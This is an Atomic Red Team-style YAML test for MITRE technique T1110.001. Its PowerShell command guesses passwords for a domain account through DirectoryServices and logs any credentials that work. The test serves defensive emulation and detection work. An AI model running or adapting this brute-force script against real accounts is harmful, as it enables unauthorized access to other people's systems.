attack_technique: T1110.001
display_name: 'Brute Force: Password Guessing'
atomic_tests:
- name: Brute Force Credentials
  auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
  description: |
    Attempt to brute force user on remote host
  supported_platforms:
  - windows
  input_arguments:
    user:
        description: Account to bruteforce
        type: String
        default: Victim
    passwords:
      description: Path to a file containing a list of passwords we will attempt to brute force with
      type: String
      default: Pa`$`$w0rd`n123456`npassword
    domain:
      description: Domain name of the target system we will brute force upon
      type: String
      default: contoso.com
    output_file:
      description: Path to bruteforce output 
      type: Path
      default: C:\Windows\Temp\tmp.txt
  executor:
    name: powershell
    command: |
      $passwords = "#{passwords}".split("`n")
      foreach ($password in $passwords){
        if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
          "[!] #{user}:$password found on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
        }
      }
      "End of bruteforce" | Out-File -FilePath #{output_file} -Append